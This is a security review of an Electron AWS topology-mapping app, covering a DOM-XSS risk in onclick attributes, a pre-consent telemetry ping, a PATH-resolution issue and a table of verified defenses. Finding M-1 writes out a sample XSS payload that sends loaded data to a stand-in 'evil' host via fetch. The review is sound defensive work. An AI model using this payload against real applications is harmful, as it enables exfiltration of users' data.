# Security Review — AWS Network Mapper

**Date:** 2026-05-22
**Scope:** Electron main process, preload boundary, IPC surface, AWS export script, telemetry module, and renderer XSS surface (untrusted AWS data).
**Method:** Full read of `main.js`, `preload.js`, `scripts/export-aws-data.sh`, `src/modules/telemetry.js`, `src/main.js`; diff review of all uncommitted changes; subagent audit of 224 HTML sinks across 8 renderer files; manual verification of the `onclick` attribute pattern.

## Verdict

**The app is well-hardened.** The Electron configuration, IPC boundary, command execution, file I/O, and HTML-text escaping are all sound — and every uncommitted change is itself a hardening or correctness improvement. The residual risk is concentrated in **one pattern**: AWS-derived values interpolated into `onclick` JS-string contexts. Combined with the app's "import arbitrary JSON files" workflow, that is an exploitable (but sandbox-contained, interaction-gated) DOM-XSS. Rated **Medium**. Two **Low** findings and one un-audited area follow.

The renderer runs with `sandbox: true` + `contextIsolation: true` + `nodeIntegration: false`, so none of the renderer findings reach Node/RCE. The realistic impact is exfiltration of loaded topology data (richer under multi-account merge) and `shell.openExternal` phishing.

---

## Findings

### M-1 (Medium) — AWS data in `onclick` JS-string context; `esc()` is the wrong escaper there

**Pattern:** `onclick="func('" + esc(AWS_FIELD) + "')"` — an attacker-controllable field is placed inside a single-quoted JS string, which sits inside a double-quoted HTML attribute. `esc()` (`src/app-core.js:790`, `src/modules/utils.js:65`) encodes only `& < > " '` and turns `'` into `&#39;`. The HTML parser **decodes `&#39;` back to `'`** when it reads the attribute, *before* the JS engine compiles the handler — so a payload like `x');fetch('//evil?d='+btoa(JSON.stringify(window._rlCtx)));//` breaks out of the string and executes on click. `esc()` is an HTML-text/attribute escaper; it does not neutralize the JS-string context. Note `( ) ; / =` are not escaped at all.

**Why it's reachable:** For genuine AWS output these fields (`VpcId`, `SubnetId`, `GroupId`, `DBInstanceIdentifier`, `FunctionName`, etc.) are charset-constrained server-side and cannot contain quotes. But the app's core workflow is importing **arbitrary JSON files** — `file:open`, folder drag, textarea paste, and `.awsmap` double-click (`main.js` `open-file`). A user mapping a colleague's shared export is a first-class use case. A crafted file sets these fields freely. The search index (`src/modules/search.js:46-54`) copies `DBInstanceIdentifier`/`FunctionName` verbatim into the `id` field that feeds the sink.

**Sites (evidence — the pattern is the finding):**
- `src/modules/search.js:88` — `esc(m.id)` ×2 into `_zoomToElement(...)` / `_openDetailForSearch(...)`
- `src/modules/search.js:215` — `_escHtml(rid)` into `clipboard.writeText(...)`
- `src/app-core.js:3145` — **`v.VpcId` interpolated raw, NO `esc()` at all** → sharpest instance: a `"` here also breaks out of the `onclick` attribute and can inject a new event handler (e.g. `" onmouseover="…`), reducing the click requirement
- `src/app-core.js:1550` — `esc(gwId)`, `esc(gwType)` into `addDesignChange({...})`
- `src/app-core.js:8954` — `esc(rid)` into `clipboard.writeText(...)`
- `src/app-core.js:9167, 9199, 9236, 9246` — `esc(SubnetId/VpcId)` into `_openDetailForSearch`/`_zoomToElement`
- `src/modules/detail-panel.js:71, 317, 324, 343, 344, 352, 388, 389, 399` — `esc()`/`_escHtml()` of `SubnetId`/`GroupId`/`VpcId`/`rid`

**Preconditions / blast radius:** requires importing a maliciously-crafted (non-genuine-AWS) file **and** clicking/hovering the rendered element. Sandbox + contextIsolation prevent Node access / RCE. Impact = exfiltration of `window._rlCtx` (the full loaded topology, including co-resident real-account data under multi-account merge) and `openExternal`-based phishing.

**Fix (precedent already in this codebase):** Stop building executable JS in attributes. Use `data-*` attributes + a delegated click listener — exactly what `src/modules/detail-panel.js` already does:

```js
// detail-panel.js:102/127 — the correct, already-proven pattern
h += '<div class="spotlight-nearby-item" data-spotlight-rid="' + _escHtml(r.id) + '">';
// detail-panel.js:134/139 — read dataset in a delegated handler, no JS-in-attribute
el.addEventListener('click', function () { _openSpotlight(this.dataset.spotlightRid); });
```

`esc()` into a `data-*` attribute is correct (single HTML-attribute context, no nested JS). For the search results, attach one delegated listener to the `#searchResults` container and read `e.target.closest('[data-id]').dataset`. Fix `app-core.js:3145` first (it is unescaped).

---

### L-1 (Low) — Telemetry sends a beacon before consent

`src/modules/telemetry.js:277` `notePrompted()` POSTs a `telemetry.opt_in_prompted` event (payload: `app_version` only) directly, **bypassing the consent gate** by design ("so prompt-to-acceptance rate is measurable"). Even with a minimal body, this reveals the client IP and the fact that the app was launched to the telemetry endpoint *before* the user opts in — a real privacy-boundary crossing under GDPR-style reasoning. It only fires when telemetry is compiled in (`ENABLED && ENDPOINT`), which is **not** the default build, so impact is limited. **Recommendation:** queue the prompted event and emit it only if the user accepts, or document this pre-consent ping explicitly in the consent UI. (The rest of the telemetry module is exemplary: dormant-by-default, opt-in gated, bucketed values, AWS-ID/ARN/region scrubber with prototype-pollution guard, `credentials: 'omit'`.)

### L-2 (Low) — `python3` resolved via PATH in `budr:export-xlsx`

`main.js:469` runs `execFileAsync('python3', [...])` using PATH lookup, while `getToolEnv()` (`main.js:31`) prepends `/usr/local/bin` and `/opt/homebrew/bin`. On multi-user macOS, `/usr/local/bin` is Homebrew-writable and could shadow `python3`. This is the standard dev-tool PATH risk and requires prior local write access, so it's defense-in-depth only. (Contrast `checkAwsCli` at `main.js:300`, which correctly uses the absolute `/usr/bin/which`.) **Recommendation:** resolve `python3` to an absolute path, or accept as documented dev-environment risk.

### N-1 (Not audited) — `scripts/export-aws-data.ps1`

The Windows PowerShell export variant (`scripts/export-aws-data.ps1`, 38 KB) is launched by `main.js:355` (`pwsh.exe -NoProfile -ExecutionPolicy Bypass -File … -p <profile> -r <region>`). Profile/region are validated by `SAFE_INPUT` upstream and passed as array args (no shell), so the launch is safe. The script's *internal* handling of AWS API responses (the PowerShell analogue of the bash script's per-value validation) was **not reviewed** in this pass. Recommend a follow-up read mirroring the bash-script checks.

---

## Confirmed Defenses (verified, not just assumed)

| Area | Evidence |
|------|----------|
| Electron hardening | `contextIsolation:true`, `nodeIntegration:false`, `sandbox:true`, dedicated `preload.js` (`main.js:78-83`) |
| Preload boundary | Minimal, explicit API; no generic `ipcRenderer.invoke/send` passthrough (`preload.js`) |
| Command injection | `SAFE_INPUT = /^[a-zA-Z0-9_-]{0,64}$/` validates profile/region; `execFile`/`spawn` with arg arrays, never a shell (`main.js:333-361`) |
| Path traversal | `isWithinPath()` containment on scan output dir (`main.js:39, 395`) |
| DoS / resource limits | Bounded reads by size, file count, and total bytes (`MAX_*` constants; `readBoundedTextFile`) — **newly added** to `file:open` and project-open paths |
| Temp file safety | `randomUUID()` temp names + cleanup in `budr:export-xlsx` (`main.js:457-494`) |
| Navigation guards | `will-navigate` restricted to app origin via `pathToFileURL()`; `setWindowOpenHandler` denies windows, `openExternal` gated to http/https (`main.js:575-583`). `../` traversal not a concern — Chromium normalizes file URLs before `will-navigate` fires |
| Auto-update | `autoUpdater.autoDownload = false`; user-initiated download/install (`main.js:503, 563`) |
| Export script | `set -euo pipefail`; AWS flags built as quoted arrays; zone-IDs/cluster-ARNs regex-validated after word-split; **diff replaced naive `sed 's/"/\\"/g'` with proper JSON escaping** (`export-aws-data.sh:88-118`) |
| Renderer HTML-**text** escaping | Subagent audit of 224 sinks across 8 files: AWS-derived free-text (`Tags.Value`, `GroupName`, `Description`, CIDR, IPs, DNS names) consistently wrapped in `esc()`/`_escHtml()`/`gn()`-escapes-by-default. No unescaped free-text in HTML-text context. |

## Uncommitted changes (diff review)

All uncommitted edits are net-positive for security:
- `main.js`: added `readBoundedTextFile` (closes an unbounded-read DoS on project open), added type+size validation to `budr:export-xlsx`, switched `appOrigin` to `pathToFileURL()` (correct URL encoding of paths with spaces/special chars), fixed a double `aws:scan:error` send.
- `scripts/export-aws-data.sh`: replaced `sed` escaping with `json_escape` (python `json.dumps`) — the old version escaped only `"`, not backslashes/control chars.
- `src/main.js`: wires telemetry, dormant-by-default and gated on `Telemetry.isEnabled()`.

## Suggested priority

1. **M-1** — fix `app-core.js:3145` (unescaped) immediately; migrate the `onclick`-string pattern to `data-*` + delegated listeners across the listed sites.
2. **L-1** — decide the pre-consent beacon policy (queue-until-accept recommended).
3. **L-2 / N-1** — absolute `python3` path; audit `export-aws-data.ps1`.
